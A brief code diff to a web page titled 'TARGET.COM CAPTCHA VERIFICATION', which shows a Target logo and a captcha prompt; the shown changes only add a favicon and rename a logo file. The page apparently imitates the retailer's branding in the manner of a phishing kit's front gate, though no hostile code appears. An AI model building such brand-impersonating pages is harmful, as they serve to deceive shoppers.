@@ -14,6 +14,8 @@ error_reporting(E_ALL);
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>TARGET.COM CAPTCHA VERIFICATION</title>
+  <link rel="icon" href="./favicon-0fcf5574e1.ico" type="image/x-icon">
+
   <style>
     body {
       margin: 0;
@@ -159,7 +161,7 @@ error_reporting(E_ALL);
 
 
 <div id="loader-container">
-<img src="./Target_logo.svg" alt="Logo" width="150" height="200">
+<img src="./Target_logo.svg.png" alt="Logo" width="150" height="200">
     <div id="loader-text">Please finish the captcha to go to the main page...</div>
 </div>
 
